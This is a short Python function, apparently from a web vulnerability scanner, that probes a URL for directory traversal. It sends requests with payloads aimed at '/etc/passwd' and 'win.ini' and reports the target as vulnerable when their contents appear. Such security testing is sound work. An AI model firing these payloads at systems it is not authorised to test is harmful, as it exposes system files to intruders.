import requests

def test_directory_traversal(url):
    payloads = ["../../../../etc/passwd", "../windows/win.ini"]
    results = []

    for payload in payloads:
        full_url = f"{url}/{payload}"
        try:
            response = requests.get(full_url)
            if "root:" in response.text or "[extensions]" in response.text:
                results.append({"payload": payload, "vulnerable": True})
            else:
                results.append({"payload": payload, "vulnerable": False})
        except Exception as e:
            results.append({"error": f"Directory Traversal test failed: {str(e)}"})

    return {"results": results}
